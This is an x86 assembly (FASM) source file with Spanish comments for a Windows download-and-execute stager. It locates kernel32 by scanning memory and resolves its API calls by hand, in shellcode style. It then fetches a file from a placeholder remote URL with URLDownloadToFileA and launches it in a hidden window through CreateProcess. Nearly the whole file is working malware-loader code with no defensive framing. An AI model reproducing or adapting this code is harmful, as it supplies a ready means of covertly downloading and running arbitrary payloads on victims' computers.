; Author: Chema Garcia (aka sch3m4)
; Contact:
;     http://safetybits.net
;     sch3m4@safetybits.net
;     http://twitter.com/sch3m4
;

format PE CONSOLE 4.0
include 'c:\fasm\include\win32a.inc'

;TIPOS DE DATOS
struct _SI_
       cb		dd	0
       pReservado	dd	0
       pEscritorio	dd	0
       pTitulo		dd	0
       posX		dd	0
       posY		dd	0
       TamX		dd	0
       TamY		dd	0
       XCountChars	dd	0
       YCountChars	dd	0
       Atributos	dd	0
       Flags		dd	0
       MostrarVentana	dw	0
       Reservado	dw	0
       pReservado2	dd	0
       EntradaStd	dd	0
       SalidaStd	dd	0
       ErrorStd 	dd	0
ends

struct _PI_
       hProceso    dd 0
       hHilo	   dd 0
       IdProceso   dd 0
       IdHilo	   dd 0
ends



section '.code' code readable writeable executable

call delta;buscamos el delta offset
delta:
pop ebp
sub ebp,[delta]
mov eax,[esp]
xor ax,ax
busca_mz:;buscamos la cabecera del kernel
cmp word [eax],0x5A4D;MZ
je enco_mz
sub eax,1000h
jmp busca_mz
enco_mz:
mov dword [esp-4],eax;base del kernel32.dll
mov ecx,dword [eax+03Ch]
add ecx,eax
mov dword [esp-8],ecx;comienzo de la cabecera PE
mov ecx,dword [ecx+78h]
add ecx,eax
mov dword [esp-0Ch],ecx;ecx = seccion de exportaciones
mov ecx,dword [ecx+20h];
add ecx,eax
;mov dword [esp-10h],ecx;tabla de nombres (de las exportaciones)
mov eax,ecx
xor edx,edx
;buscamos la api "GetProcAddress"
busca:
mov edi,[eax]
add edi,dword [esp-4]
lea esi,dword [GPA]
mov ecx,0Eh
rep cmpsb
je calcula_offset
add eax,4
inc edx
jmp busca

calcula_offset:
mov eax,dword [esp-0Ch]
mov eax,dword [eax+24h]
add eax, dword [esp-4]
rol edx,1
add eax,edx
mov cx,word [eax]
mov eax,dword [esp-0Ch]
mov eax,dword [eax+1Ch]
add eax,dword [esp-4]
rol ecx,2
xadd eax,ecx
mov eax,dword [eax]
add eax,dword [esp-4]
mov dword [oGPA],eax
mov ecx,[esp-4]
mov [kBase],ecx
;tenemos la base del kernel en kBase

;sacamos las apis
lea edi,dword [APIs]
lea esi,dword [Offsets]
sacar_apis:
push edi
push dword [kBase]
call [oGPA]
mov [esi],eax
;nos vamos a la siguiente api
siguiente:
cmp byte [edi],0
je sigue
inc edi
jmp siguiente
sigue:
add esi,4
inc edi
cmp byte [edi],'-'
jne sacar_apis

;por comodidad
LoadLibrary	    equ dword [Offsets]
CreateProcess	    equ dword [Offsets+4]
ExitProcess	    equ dword [Offsets+8]
UrlDownloadToFile   equ dword [Offsets+0Ch]

;cargamos urlmon.dll
push urlmon
call LoadLibrary
;sacamos URLDownloadToFile
push URLDownloadToFileA
push eax
call [oGPA]
mov dword [Offsets+0Ch],eax

;descargamos el archivo
push 0
push 0
push Archivo
push URL
push 0
call UrlDownloadToFile

;lo ejecutamos
mov [StartupInfo.cb],44h
mov [StartupInfo.Flags],1;STARTF_USESHOWWINDOW
mov [StartupInfo.MostrarVentana],0;SW_HIDE
push ProcessInformation
push StartupInfo
push 0
push 0
push 0x200;CREATE_NEW_PROCESS_GROUP
push 0
push 0
push 0
push Archivo
push 0
call CreateProcess

;salimos
push 0
call ExitProcess

;A DESCARGAR
URL			db 'http://ruta_remota/archivo',0
Archivo 		db 'ruta_local',0

;PARA CREAR EL PROCESO
ProcessInformation	_PI_
StartupInfo		_SI_

;para almacenar la base del kernel y la direcci?n de GetProcAddress
kBase			dd 0;base del kernel
GPA			db 'GetProcAddress',0
oGPA			dd 0

;Funciones de librer?as externas
urlmon			db 'urlmon.dll',0
URLDownloadToFileA	db 'URLDownloadToFileA',0

;Funciones del kernel
APIs:
db 'LoadLibraryA',0
db 'CreateProcessA',0
db 'ExitProcess',0
db '-',0

;offset almacenamos
Offsets:
dd 4 dup(0)
